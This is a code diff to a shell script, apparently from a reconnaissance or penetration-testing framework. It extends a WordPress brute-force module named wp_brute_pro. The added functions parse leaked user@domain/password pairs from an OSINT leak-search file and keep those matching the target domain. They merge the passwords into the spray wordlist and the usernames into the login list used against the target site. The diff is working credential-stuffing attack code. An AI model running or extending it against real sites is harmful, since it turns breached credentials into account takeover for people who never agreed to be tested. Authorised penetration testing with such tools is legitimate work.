@@ -1067,6 +1067,63 @@ _wp_brute_safe_dirname() {
     echo "$1" | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's|:|_|g' -e 's/[^a-zA-Z0-9._-]/_/g'
 }
 
+# Parse osint/passwords.txt (LeakSearch table: user@domain password) -> password + username lists.
+# Usage: _wp_brute_parse_osint_leaks <passwords_out> <usernames_out>
+_wp_brute_parse_osint_leaks() {
+    local passwords_out="$1"
+    local usernames_out="$2"
+    local osint_file="osint/passwords.txt"
+
+    [[ ${WP_BRUTE_USE_OSINT_PASSWORDS:-true} == true ]] || return 1
+    [[ -s "$osint_file" ]] || return 1
+
+    awk -v domain="$domain" '
+    function domain_match(email,   d) {
+        d = tolower(domain)
+        return (tolower(email) ~ ("@" d "$"))
+    }
+    /^[[:space:]]*$/ { next }
+    /^[-=]+[[:space:]]*[-=]+/ { next }
+    /^Username@Domain/ { next }
+    /^Password/ { next }
+    {
+        email = $1
+        pwd = $2
+        if (email !~ /@/ || pwd == "" || pwd ~ /^-+$/ ) next
+        if (domain != "" && !domain_match(email)) next
+        print pwd
+        split(email, parts, "@")
+        user = parts[1]
+        gsub(/[^a-zA-Z0-9._-]/, "", user)
+        if (user != "") print user
+    }' "$osint_file" >"${passwords_out}.raw" 2>/dev/null || return 1
+
+    [[ ! -s "${passwords_out}.raw" ]] && return 1
+
+    awk 'NF { print $1 }' "${passwords_out}.raw" | grep -aE '.+' | anew -q "$passwords_out"
+    awk 'NF { print $1 }' "${passwords_out}.raw" | grep -aE '^[a-zA-Z0-9._-]+$' | anew -q "$usernames_out"
+    rm -f "${passwords_out}.raw"
+    [[ -s "$passwords_out" ]]
+}
+
+# Merge short wordlist + optional osint leak passwords for wp-brute-pro spray.
+# Usage: _wp_brute_build_attack_wordlist <dest_file>
+_wp_brute_build_attack_wordlist() {
+    local dest="$1"
+    local base_list="${WP_BRUTE_WORDLIST:-${SCRIPTPATH}/data/wordlists/wp_brute_short.txt}"
+
+    : >"$dest"
+    [[ -s "$base_list" ]] && cat "$base_list" | sed 's/\r$//' | anew -q "$dest"
+
+    if _wp_brute_parse_osint_leaks ".tmp/wp_brute_osint_passwords.txt" ".tmp/wp_brute_osint_users.txt"; then
+        cat ".tmp/wp_brute_osint_passwords.txt" | anew -q "$dest"
+        _print_msg INFO "Merged $(wc -l <".tmp/wp_brute_osint_passwords.txt" | tr -d ' ') password(s) from osint/passwords.txt"
+    fi
+
+    sort -u "$dest" -o "$dest" 2>/dev/null || true
+    [[ -s "$dest" ]]
+}
+
 # Run wp-brute-pro scanner only (phase 1) and write JSON.
 _wp_brute_run_recon() {
     local target_url="$1"
@@ -1126,16 +1183,23 @@ function wp_brute_pro() {
             do_attack=true
         fi
 
-        local target_url users_csv company_name host_key out_dir summary_file attack_wordlist attack_wordlist_count
+        local target_url users_csv company_name host_key out_dir summary_file attack_wordlist attack_wordlist_count osint_users_csv
         : >"vulns/wp_brute/summary.txt"
         summary_file="vulns/wp_brute/summary.txt"
 
-        attack_wordlist="${WP_BRUTE_WORDLIST:-${SCRIPTPATH}/data/wordlists/wp_brute_short.txt}"
-        if [[ ! -s "$attack_wordlist" ]]; then
-            attack_wordlist="${SCRIPTPATH}/data/wordlists/wp_brute_short.txt"
+        if ! _wp_brute_build_attack_wordlist ".tmp/wp_brute_attack_wordlist.txt"; then
+            _print_msg WARN "${FUNCNAME[0]}: no attack wordlist available (short list + osint passwords empty)"
+            if [[ "$do_attack" == true ]]; then
+                do_attack=false
+            fi
         fi
+        attack_wordlist=".tmp/wp_brute_attack_wordlist.txt"
         attack_wordlist_count=$(wc -l <"$attack_wordlist" 2>/dev/null | tr -d ' ')
         [[ -z "$attack_wordlist_count" || "$attack_wordlist_count" -eq 0 ]] && attack_wordlist_count="${WP_BRUTE_MAX_PASSWORDS:-50}"
+
+        if [[ -s ".tmp/wp_brute_osint_users.txt" ]]; then
+            osint_users_csv=$(paste -sd, ".tmp/wp_brute_osint_users.txt" 2>/dev/null || true)
+        fi
 
         company_name="${WP_BRUTE_COMPANY:-}"
         if [[ -z "$company_name" ]]; then
@@ -1155,6 +1219,14 @@ function wp_brute_pro() {
             fi
 
             users_csv=$(jq -r '[.users[]?.slug // empty] | join(",")' "${out_dir}/scan.json" 2>/dev/null)
+            if [[ -n "$osint_users_csv" ]]; then
+                if [[ -n "$users_csv" ]]; then
+                    users_csv="${users_csv},${osint_users_csv}"
+                else
+                    users_csv="$osint_users_csv"
+                fi
+                users_csv=$(echo "$users_csv" | tr ',' '\n' | sed '/^$/d' | sort -u | paste -sd, -)
+            fi
             local wp_version xmlrpc_status waf_name
             wp_version=$(jq -r '.wp_version // "unknown"' "${out_dir}/scan.json" 2>/dev/null)
             xmlrpc_status=$([[ $(jq -r '.xmlrpc_active // false' "${out_dir}/scan.json" 2>/dev/null) == "true" ]] && echo active || echo disabled)
